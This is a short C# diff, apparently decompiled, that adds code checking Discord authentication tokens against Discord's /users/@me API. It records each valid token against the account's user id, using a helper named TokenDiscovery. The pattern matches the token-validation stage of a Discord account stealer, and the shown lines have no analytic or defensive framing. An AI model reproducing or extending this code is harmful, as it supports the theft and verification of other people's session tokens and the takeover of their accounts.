@@ -1,0 +1,18 @@
+HttpResponseMessage result = new HttpClient
+{
+	DefaultRequestHeaders =
+	{
+		{
+			"Authorization",
+			value
+		}
+	}
+}.GetAsync("https://discord.com/api/v8/users/@me").Result;
+bool flag = result.StatusCode == HttpStatusCode.OK;
+if (flag)
+{
+	string result2 = result.Content.ReadAsStringAsync().Result;
+	dictionary[ulong.Parse(TokenDiscovery.Extract(result2, "\"id\":", ',').Replace("\"", ""))] = value;
+}
+
+
